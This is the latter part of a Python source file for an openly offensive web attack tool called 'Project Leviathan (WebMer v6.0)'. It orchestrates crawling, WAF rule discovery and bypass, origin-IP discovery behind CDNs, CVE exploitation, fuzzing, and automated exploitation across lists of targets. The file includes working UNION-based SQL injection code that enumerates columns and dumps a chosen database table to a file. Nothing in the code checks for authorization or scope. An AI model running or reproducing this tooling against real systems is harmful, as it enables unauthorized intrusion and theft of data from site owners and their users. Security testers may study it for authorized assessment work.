           ██║   ███████╗███████║███████╗██║  ██║██║  ██║╚██████╔╝██║  ██║███████╗███████║
           ╚═╝   ╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚══════╝
        {Style.RESET_ALL}"""
        print(banner)
        print(f"{Fore.CYAN}{'='*60}")
        print(f"{Fore.YELLOW}  Project Leviathan (WebMer v6.0) - The Intelligent Deep Offensive Platform")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}  Developed by Anas Erami")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}\n")

    @staticmethod
    def generate_report(tech_stack, vulnerabilities, target, scan_time, defense_bypass_info=None):
        report = [
            f"# Project Leviathan Security Report - {target}",
            f"**Scan Date**: {time.ctime()}  \n**Scan Duration**: {scan_time:.2f} seconds\n",
            "## Technology Stack\n```json"
        ]
        
        report.append(json.dumps(tech_stack, indent=2))
            
        if defense_bypass_info:
            report.append("```\n## Defense Evasion & Bypass Information\n")
            if defense_bypass_info.get('waf_identification'):
                report.append(f"- **WAF Identified**: `{defense_bypass_info['waf_identification']}`")
                if defense_bypass_info.get('waf_rules'):
                    report.append("- **WAF Rule Discovery Findings**:")
                    for rule in defense_bypass_info['waf_rules']:
                        report.append(f"  - `{rule}`")
            if defense_bypass_info.get('origin_ip'):
                report.append(f"- **Origin IP Discovered**: `{defense_bypass_info['origin_ip']}`")
            if defense_bypass_info.get('ssl_stripping_attempt'):
                report.append(f"- **SSL Stripping Attempted**: `{defense_bypass_info['ssl_stripping_attempt']}`")
                report.append(f"  (Note: SSL Stripping requires a Man-in-the-Middle position and is a complex attack.)")
            if defense_bypass_info.get('http_smuggling_attempt'):
                report.append(f"- **HTTP Request Smuggling Attempted**: `{defense_bypass_info['http_smuggling_attempt']}`")
                report.append(f"  (Note: Requires an active mitmproxy instance configured for smuggling via 'X-Smuggling-Payload' header.)")


        report.append("\n## Vulnerabilities\n")
        
        if not vulnerabilities:
            report.append("No vulnerabilities found")
        else:
            for i, vuln in enumerate(vulnerabilities, 1):
                report.append(f"### Vulnerability #{i}")
                report.append(f"- **Type**: `{vuln['type']}`")
                report.append(f"- **URL**: `{vuln['url']}`")
                report.append(f"- **Parameter**: `{vuln['param']}`")
                report.append(f"- **Payload**: `{vuln['payload']}`")
                report.append(f"- **Status Code**: `{vuln['status']}`")
                report.append(f"- **Response Length**: `{vuln['length']}`")
                report.append(f"- **Evidence**: `{vuln['evidence']}`")
                report.append(f"- **Proof of Concept**:")
                report.append(f"```{vuln['poc']}```")
                
                confidence_level = "Low"
                if vuln['confidence'] >= 0.9:
                    confidence_level = f"{Fore.RED}High{Style.RESET_ALL}"
                elif vuln['confidence'] >= 0.7:
                    confidence_level = f"{Fore.YELLOW}Medium{Style.RESET_ALL}"
                else:
                    confidence_level = f"{Fore.CYAN}Low{Style.RESET_ALL}"
                report.append(f"- **Confidence**: {confidence_level}")
                report.append("---")
        
        return "\n".join(report)

    @staticmethod
    def print_summary(vulnerabilities, scan_time):
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"{Fore.YELLOW}  Scan Summary")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}  Scan Duration: {scan_time:.2f} seconds")
        
        vuln_count = {
            'SQLiModule': 0,
            'XSSModule': 0,
            'HeaderFuzzModule': 0,
            'URLPathFuzzModule': 0,
            'SmugglingModule': 0, 
            'DirectoryBruteforceModule': 0,
            'SSRFModule': 0,
            'XXEModule': 0,
            'CSRFModule': 0,
            'PolymorphicMutatorModule': 0,
            'Known CVE (WordPress Authenticated Stored XSS)': 0,
            'Known CVE (Nginx HTTP Request Smuggling)': 0,
            'Known CVE (Apache Remote Code Execution)': 0,
            'Known CVE (OpenSSL DoS)': 0,
            'Subdomain Scan Result (Potentially Vulnerable)': 0,
            'Other': 0
        }
        
        for vuln in vulnerabilities:
            if vuln['type'] in vuln_count:
                vuln_count[vuln['type']] += 1
            else:
                vuln_count['Other'] += 1
        
        print(f"{Fore.GREEN}  SQL Injection: {vuln_count['SQLiModule']}")
        print(f"{Fore.GREEN}  Cross-Site Scripting (XSS): {vuln_count['XSSModule']}")
        print(f"{Fore.GREEN}  Header Fuzzing: {vuln_count['HeaderFuzzModule']}")
        print(f"{Fore.GREEN}  URL Path Fuzzing: {vuln_count['URLPathFuzzModule']}")
        print(f"{Fore.GREEN}  HTTP Request Smuggling: {vuln_count['SmugglingModule']}")
        print(f"{Fore.GREEN}  Directory Bruteforce: {vuln_count['DirectoryBruteforceModule']}")
        print(f"{Fore.GREEN}  SSRF: {vuln_count['SSRFModule']}")
        print(f"{Fore.GREEN}  XXE: {vuln_count['XXEModule']}")
        print(f"{Fore.GREEN}  CSRF: {vuln_count['CSRFModule']}")
        print(f"{Fore.GREEN}  Polymorphic Mutation: {vuln_count['PolymorphicMutatorModule']}")
        print(f"{Fore.GREEN}  Known CVEs (WordPress): {vuln_count['Known CVE (WordPress Authenticated Stored XSS)']}")
        print(f"{Fore.GREEN}  Known CVEs (Nginx Smuggling): {vuln_count['Known CVE (Nginx HTTP Request Smuggling)']}")
        print(f"{Fore.GREEN}  Known CVEs (Apache RCE): {vuln_count['Known CVE (Apache Remote Code Execution)']}")
        print(f"{Fore.GREEN}  Known CVEs (OpenSSL DoS): {vuln_count['Known CVE (OpenSSL DoS)']}")
        print(f"{Fore.GREEN}  Vulnerable Subdomains: {vuln_count['Subdomain Scan Result (Potentially Vulnerable)']}")
        print(f"{Fore.GREEN}  Other: {vuln_count['Other']}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")

class WebMerScanner:
    def __init__(self, args):
        self.args = args
        self.brain = QLearningBrain()
        
        self.initial_headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive'
        }
        
        ssl_context = ssl.create_default_context()
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE
                
        self.connector = aiohttp.TCPConnector(ssl=ssl_context, limit=self.args.concurrency)
        self.session = aiohttp.ClientSession(
            connector=self.connector,
            headers=self.initial_headers,
            cookies=self._parse_cookies(args.cookies) if args.cookies else None,
            proxy=args.proxy if args.proxy else None
        )
        
        self.verbose = args.verbose
        self.recon = ReconEngine(self.session) 

    def _parse_cookies(self, cookie_string):
        cookies = {}
        for cookie in cookie_string.split(';'):
            name, value = cookie.split('=', 1)
            cookies[name.strip()] = value.strip()
        return cookies

    async def __aenter__(self):
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.session and not self.session.closed:
            await self.session.close()
        self.brain.close() # Ensure brain connection is closed

    async def scan_target(self, target):
        start_time = time.time()
        session_file_name = urllib.parse.urlparse(target).netloc.replace('.', '_') + ".json"
        session_path = os.path.join("sessions", session_file_name)
        
        recon_data = None
        if self.args.resume and os.path.exists(session_path):
            print(Fore.BLUE + f"[*] Resuming session from {session_path}...")
            try:
                with open(session_path, 'r') as f:
                    session_data = json.load(f)
                    recon_data = session_data.get('recon_data')
                    
                    self.recon.endpoints = set(recon_data.get('endpoints', []))
                    self.recon.parameters = {k: [dict(t) for t in v] for k, v in recon_data.get('parameters', {}).items()} 
                    self.recon.js_files = set(recon_data.get('js_files', []))
                    self.recon.robots = recon_data.get('robots', [])
                    self.recon.sitemap = recon_data.get('sitemap', [])
                    self.recon.processed_urls = set(recon_data.get('processed_urls', []))
                    
                    if self.verbose:
                        print(Fore.GREEN + f"[+] Loaded {len(self.recon.endpoints)} endpoints from session.")
            except Exception as e:
                print(Fore.RED + f"[!] Failed to load session from {session_path}: {e}. Starting new scan.")
                recon_data = None 

        if recon_data is None:
            if self.verbose:
                print(Fore.CYAN + f"[*] Crawling: {target}")
            self.recon = ReconEngine(self.session)
            await self.recon.crawl(target)
        
        if self.verbose:
            print(Fore.GREEN + f"[+] Found {len(self.recon.endpoints)} endpoints")
            print(Fore.GREEN + f"[+] Found {sum(len(v) for v in self.recon.parameters.values())} forms")
        
        if self.verbose:
            print(Fore.CYAN + "[*] Fingerprinting technology stack...")
        fingerprinter = FingerprintEngine(target, self.session)
        tech_stack = await fingerprinter.fingerprint()
        
        defense_bypass_info = {}
        if self.verbose:
            print(Fore.GREEN + "[+] Technology stack identified:")
            for tech, details in tech_stack.items():
                print(f"  - {tech}: {details}")
            if GLOBAL_WAF_DETECTED:
                print(Fore.RED + "[!] WAF detected! Activating adaptive mode for fuzzing.")
        
        waf_bypass_module = WAFBypassModule(self.session)
        identified_waf = await waf_bypass_module.identify_waf(target)
        if identified_waf:
            defense_bypass_info['waf_identification'] = identified_waf
            waf_rules = await waf_bypass_module.discover_waf_rules(target)
            if waf_rules:
                defense_bypass_info['waf_rules'] = waf_rules

        origin_ip_module = OriginIPDiscoveryModule(self.session)
        parsed_url = urllib.parse.urlparse(target)
        origin_ip = await origin_ip_module.discover_origin_ip(parsed_url.netloc)
        if origin_ip:
            defense_bypass_info['origin_ip'] = origin_ip
            print(Fore.GREEN + f"[+] Discovered Origin IP: {origin_ip}. Future attacks can target this IP directly.")

        if self.args.ssl_strip:
            defense_bypass_info['ssl_stripping_attempt'] = "Initiated (requires external MITM setup)"
            print(Fore.YELLOW + "[!] SSL Stripping initiated. This requires WebMer to be in a Man-in-the-Middle position.")
            print(Fore.YELLOW + "    (Conceptual: Full MITM integration with mitmproxy is highly complex and not implemented directly in this single file.)")

        if self.args.http_smuggle and self.args.proxy:
             print(Fore.YELLOW + "[!] HTTP Request Smuggling tests enabled. Ensure mitmproxy is running as proxy and configured for smuggling.")
             defense_bypass_info['http_smuggling_attempt'] = "Enabled via mitmproxy interaction"
        elif self.args.http_smuggle and not self.args.proxy:
             print(Fore.RED + "[!] HTTP Request Smuggling requires a proxy (like mitmproxy) to be specified with --proxy.")


        fuzzer = Fuzzer(self.session, self.brain, waf_detected=GLOBAL_WAF_DETECTED, concurrency=self.args.concurrency)
        all_detected_vulnerabilities = []

        known_lib_exploit_module = KnownLibraryExploitationModule(self.session)
        cve_vulnerabilities = await known_lib_exploit_module.check_for_known_vulnerabilities(tech_stack)
        for cve_vuln in cve_vulnerabilities:
            if cve_vuln.get('exploit_template'):
                poc, confidence = await known_lib_exploit_module.execute_nuclei_template(target, cve_vuln['exploit_template'])
                if confidence > 0.6: 
                    all_detected_vulnerabilities.append({
                        'url': target,
                        'param': 'N/A',
                        'payload': cve_vuln['cve_id'],
                        'type': cve_vuln['type'],
                        'status': 0, 
                        'length': 0, 
                        'evidence': cve_vuln['description'],
                        'poc': poc,
                        'confidence': confidence
                    })
            else: 
                all_detected_vulnerabilities.append({
                    'url': target,
                    'param': 'N/A',
                    'payload': cve_vuln['cve_id'],
                    'type': cve_vuln['type'],
                    'status': 0, 
                    'length': 0, 
                    'evidence': cve_vuln['description'],
                    'poc': "No automated exploit available, manual verification recommended.",
                    'confidence': cve_vuln['confidence'] 
                })

        directory_brute_module = DirectoryBruteforceModule(self.session)
        print(Fore.CYAN + f"[*] Starting directory bruteforce on {target}...")
        dir_brute_results = await directory_brute_module.fuzz(self.session, target, {}, self.initial_headers, {'status': 404, 'length': 100, 'content': b'404 Not Found'}) 
        all_detected_vulnerabilities.extend(dir_brute_results)
        
        subdomain_enum_module = AdvancedSubdomainEnumerationModule(self.session)
        discovered_subdomains = await subdomain_enum_module.enumerate_subdomains(parsed_url.netloc)
        if discovered_subdomains:
            subdomain_vulns = await subdomain_enum_module.scan_interesting_subdomains(discovered_subdomains, self)
            all_detected_vulnerabilities.extend(subdomain_vulns)

        if self.args.api_spec:
            api_module = APIModule(self.session)
            await api_module.load_spec(self.args.api_spec)
            if api_module.endpoints:
                print(Fore.CYAN + f"[*] Starting API Fuzzing for {len(api_module.endpoints)} endpoints...")
                api_fuzzing_results = await api_module.fuzz_api_endpoints(fuzzer.modules, self.initial_headers, fuzzer.get_baseline_response, tech_stack, self.brain)
                all_detected_vulnerabilities.extend(api_fuzzing_results)
            else:
                print(Fore.YELLOW + "[!] No API endpoints found in the provided specification.")
        else: 
            if self.verbose:
                print(Fore.CYAN + f"[*] Fuzzing {sum(len(v) for v in self.recon.parameters.values())} parameters and headers...")
            
            fuzzing_tasks = []
            for endpoint, forms in self.recon.parameters.items():
                for form_data in forms:
                    fuzzing_tasks.append(fuzzer.fuzz(endpoint, form_data, self.initial_headers, tech_stack, self.args.collaborator)) 
            
            fuzzer_results = await asyncio.gather(*fuzzing_tasks)
            for res_list in fuzzer_results:
                all_detected_vulnerabilities.extend(res_list)

        if self.verbose:
            print(Fore.CYAN + "[*] Exploiting and verifying vulnerabilities...")
        
        final_vulnerabilities = []
        exploit_tasks = []
        for vuln_data in all_detected_vulnerabilities:
            module_name = vuln_data['type']
            for module in fuzzer.modules:
                if module.__class__.__name__ == module_name:
                    form_data = next(
                        (form for form in self.recon.parameters.get(vuln_data['url'], []) 
                         if vuln_data['param'] and vuln_data['param'].replace('Header: ', '') in form['params']),
                        None
                    ) or {'method': 'get', 'params': {}}
                    
                    param_for_exploit = vuln_data['param'] if vuln_data['param'] != 'N/A' else None
                    if param_for_exploit and "Header: " in param_for_exploit:
                         param_for_exploit = param_for_exploit.replace("Header: ", "")
                    elif module_name == 'SmugglingModule':
                        param_for_exploit = "HTTP_Request_Smuggling_Context" 
                    elif module_name == 'DirectoryBruteforceModule':
                        param_for_exploit = "Directory_Path"
                    elif module_name == 'SSRFModule':
                        param_for_exploit = "SSRF_Payload_Context" 
                    elif module_name == 'XXEModule':
                        param_for_exploit = "XXE_Payload_Context" 
                    elif module_name == 'CSRFModule':
                        param_for_exploit = "CSRF_Context" 
                    elif module_name == 'PolymorphicMutatorModule':
                        param_for_exploit = "Polymorphic_Mutation_Context"

                    exploit_tasks.append(
                        module.exploit(
                            self.session,
                            vuln_data['url'],
                            param_for_exploit,
                            vuln_data['payload'],
                            form_data['method'],
                            form_data['params']
                        )
                    )
                    break
            else: 
                if "Known CVE" in vuln_data['type'] or "Subdomain Scan Result" in vuln_data['type']:
                    final_vulnerabilities.append(vuln_data)
                else: 
                    final_vulnerabilities.append(vuln_data)
        
        results_from_exploit_tasks = await asyncio.gather(*exploit_tasks, return_exceptions=True)

        idx = 0
        for i, vuln_data in enumerate(all_detected_vulnerabilities):
            if "Known CVE" in vuln_data['type'] or "Subdomain Scan Result" in vuln_data['type']:
                continue

            poc_or_exception = results_from_exploit_tasks[idx]
            idx += 1

            if isinstance(poc_or_exception, Exception):
                print(Fore.RED + f"[!] Error during exploitation for {vuln_data['url']} ({vuln_data['type']}): {poc_or_exception}")
                vuln_data['poc'] = f"Exploitation failed: {poc_or_exception}"
                vuln_data['confidence'] = 0.4 
            else:
                poc, confidence = poc_or_exception
                vuln_data['poc'] = poc
                vuln_data['confidence'] = confidence
            final_vulnerabilities.append(vuln_data)

        scan_time = time.time() - start_time
        report = Reporter.generate_report(tech_stack, final_vulnerabilities, target, scan_time, defense_bypass_info)
        
        if self.args.output:
            filename = self.args.output
            if self.args.list:
                filename = f"{urllib.parse.urlparse(target).netloc.replace('.', '_')}_{filename}"
                
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(report)
            print(Fore.GREEN + f"[+] Report saved to {filename}")

        os.makedirs("sessions", exist_ok=True)
        session_data = {
            'target': target,
            'scan_time': time.ctime(),
            'recon_data': {
                'endpoints': list(self.recon.endpoints),
                'parameters': {k: [dict(t) for t in v] for k, v in self.recon.parameters.items()}, 
                'js_files': list(self.recon.js_files),
                'robots': self.recon.robots, 
                'sitemap': self.recon.sitemap, 
                'processed_urls': list(self.recon.processed_urls)
            },
            'tech_stack': tech_stack,
            'vulnerabilities': final_vulnerabilities,
            'defense_bypass_info': defense_bypass_info
        }
        with open(session_path, 'w', encoding='utf-8') as f:
            json.dump(session_data, f, indent=4)
        print(Fore.GREEN + f"[+] Session saved to {session_path}")
        
        Reporter.print_summary(final_vulnerabilities, scan_time)
        
        return final_vulnerabilities

def run_scanner_process(target, args_dict, brain_file):
    async def _scan():
        local_args = argparse.Namespace(**args_dict)
        local_args.output = f"report_{target.replace('://', '_').replace('/', '_')}.md" 

        async with WebMerScanner(local_args) as scanner: 
            scanner.brain.brain_file = brain_file 
            await scanner.scan_target(target)

    asyncio.run(_scan())

def open_new_terminal(command, title="Cerebrus Process"):
    try:
        if os.environ.get('TMUX'):
            subprocess.Popen(['tmux', 'new-window', '-n', title, command])
        elif 'GNOME_TERMINAL_SCREEN' in os.environ:
            subprocess.Popen(['gnome-terminal', '--title', title, '--', 'bash', '-c', command + '; exec bash'])
        elif os.name == 'posix':
            subprocess.Popen(['xterm', '-title', title, '-e', command + '; bash'])
        elif os.name == 'nt':
            subprocess.Popen(['start', 'cmd', '/k', command], shell=True)
        else:
            print(Fore.YELLOW + "[!] Cannot open new terminal. Please run the command manually: " + command)
            return False
        return True
    except FileNotFoundError:
        print(Fore.RED + f"[!] Terminal command not found. Please ensure 'tmux'/'gnome-terminal'/'xterm'/'start' is in your PATH.")
        return False
    except Exception as e:
        print(Fore.RED + f"[!] Failed to open new terminal: {e}")
        return False


async def main():
    parser = argparse.ArgumentParser(description='Project Leviathan (WebMer v6.0) - The Intelligent Deep Offensive Platform')
    parser.add_argument('-u', '--url', help='Single target URL to scan')
    parser.add_argument('--list', help='File containing list of targets')
    parser.add_argument('-c', '--cookies', help='Session cookies (e.g., "ID=123; role=user")')
    parser.add_argument('-o', '--output', help='Output report filename')
    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output')
    parser.add_argument('--concurrency', type=int, default=50, help='Number of concurrent requests')
    parser.add_argument('--proxy', help='Proxy URL (e.g., http://127.0.0.1:8080)')
    parser.add_argument('--resume', action='store_true', help='Resume a previous scan')
    parser.add_argument('--dump', help='Attempt to dump a table from an SQLi vulnerability')
    parser.add_argument('--api-spec', help='Path to an OpenAPI/Swagger specification file')
    parser.add_argument('--multi-process', type=int, nargs='?', const=os.cpu_count(), default=0, help='Enable multiprocessing. Optionally specify number of processes.')
    parser.add_argument('--multi-terminal', action='store_true', help='Open new terminals for certain operations')
    parser.add_argument('--ssl-strip', action='store_true', help='Conceptual SSL Stripping (requires MITM setup)')
    parser.add_argument('--http-smuggle', action='store_true', help='Enable HTTP Request Smuggling tests (requires proxy)')
    parser.add_argument('--collaborator', help='Your collaborator domain for OOB interactions (e.g., yourdomain.com)')
    
    args = parser.parse_args()

    if not args.url and not args.list and not args.api_spec:
        print(Fore.RED + "[!] Please specify either --url, --list, or --api-spec")
        return
        
    Reporter.print_banner()
    
    targets = []
    if args.url:
        targets.append(args.url)
    if args.list:
        with open(args.list, 'r') as f:
            targets.extend([line.strip() for line in f.readlines() if line.strip()])
    
    if args.api_spec and not args.url: 
        targets.append("api_scan_target") 

    if args.multi_process and args.list and len(targets) > 1:
        print(Fore.BLUE + f"[*] Starting multiprocessing scan for {len(targets)} targets...")
        process_pool_args = []
        brain_file = "brain.db" 
        for target_url in targets:
            args_dict = vars(args)
            args_dict['url'] = target_url 
            args_dict['list'] = None 
            process_pool_args.append((target_url, args_dict, brain_file))

        with concurrent.futures.ProcessPoolExecutor(max_workers=args.multi_process) as executor:
            executor.map(run_scanner_process, *zip(*process_pool_args)) 
        
        print(Fore.GREEN + "\n[+] All multiprocessing scans completed.")
    else:
        async with WebMerScanner(args) as scanner:
            all_vulnerabilities = []
            
            for target in targets:
                print(Fore.BLUE + f"\n[*] Scanning target: {target}")
                vulnerabilities = await scanner.scan_target(target)
                all_vulnerabilities.extend(vulnerabilities)
                
                if args.dump and args.url == target: 
                    sqli_vulns = [v for v in vulnerabilities if v['type'] == 'SQLiModule' and v['confidence'] >= 0.8]
                    if sqli_vulns:
                        dump_cmd = f"python3 {os.path.abspath(__file__)} --url {target} --dump {args.dump} --verbose" 
                        if args.proxy:
                            dump_cmd += f" --proxy {args.proxy}"
                        
                        if args.multi_terminal:
                            print(Fore.YELLOW + f"[*] Opening new terminal for SQLi data dump...")
                            open_new_terminal(dump_cmd, f"Cerebrus - SQLi Dump {args.dump}")
                        else:
                            print(Fore.YELLOW + f"[*] Attempting to dump data from table '{args.dump}' using identified SQLi vulnerability (in current terminal)...")
                            sqli_module_instance = SQLiModule()
                            for vuln in sqli_vulns:
                                try:
                                    num_columns = 0
                                    for i in range(1, 20): 
                                        order_by_payload = vuln['payload'].replace("--", "") + f" ORDER BY {i}--"
                                        test_params = {}
                                        if vuln['param'] and vuln['param'] != 'N/A':
                                            test_params = {vuln['param']: order_by_payload}
                                        
                                        try:
                                            if vuln['method'] == 'get':
                                                async with scanner.session.get(vuln['url'], params=test_params, timeout=5) as response:
                                                    if response.status == 200:
                                                        num_columns = i
                                                    else:
                                                        break
                                            else:
                                                async with scanner.session.post(vuln['url'], data=test_params, timeout=5) as response:
                                                    if response.status == 200:
                                                        num_columns = i
                                                    else:
                                                        break
                                        except Exception:
                                            break
                                    if num_columns > 0:
                                        union_cols = ','.join(['NULL'] * (num_columns - 1) + [f"GROUP_CONCAT({args.dump}.*, 0x3a)"]) 
                                        dump_payload = vuln['payload'].replace("--", "") + f" UNION SELECT {union_cols} FROM {args.dump} --"
                                        
                                        test_params = {}
                                        if vuln['param'] and vuln['param'] != 'N/A':
                                            test_params = {vuln['param']: dump_payload}

                                        if vuln['method'] == 'get':
                                            async with scanner.session.get(vuln['url'], params=test_params, timeout=20) as response:
                                                dump_content = await response.text()
                                        else:
                                            async with scanner.session.post(vuln['url'], data=test_params, timeout=20) as response:
                                                dump_content = await response.text()

                                        if response.status == 200 and "Error" not in dump_content and "syntax" not in dump_content:
                                            dump_filename = f"dump_{urllib.parse.urlparse(target).netloc.replace('.', '_')}_{args.dump}.txt"
                                            with open(dump_filename, 'w', encoding='utf-8') as f:
                                                f.write(dump_content)
                                            print(Fore.GREEN + f"[+] Data from table '{args.dump}' potentially dumped to {dump_filename}")
                                            print(Fore.CYAN + "    (Note: Manual review of the dump file is highly recommended as content may vary based on column count and display.)")
                                        else:
                                            print(Fore.RED + f"[!] Failed to dump data from table '{args.dump}' for {vuln['url']}. Response status: {response.status}")
                                    else:
                                        print(Fore.RED + f"[!] Could not determine column count for SQLi dump on {vuln['url']}. Skipping dump.")
                                except Exception as e:
                                    print(Fore.RED + f"[!] Error during data dump attempt: {e}")
                    else:
                        print(Fore.YELLOW + "[!] No high-confidence SQLi vulnerabilities found to attempt data dumping.")
                
                await asyncio.sleep(args.delay if hasattr(args, 'delay') else 0.5)
            
            print(Fore.GREEN + f"\n[+] Total vulnerabilities found across all targets: {len(all_vulnerabilities)}")

def main_entry():
    """The synchronous entry point for the command line."""
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Scan interrupted by user.")
    except SystemExit:
        pass
    except Exception as e:
        print(f"\n{Fore.RED}[!] A critical top-level error occurred: {e}")

if __name__ == "__main__":
    main_entry()
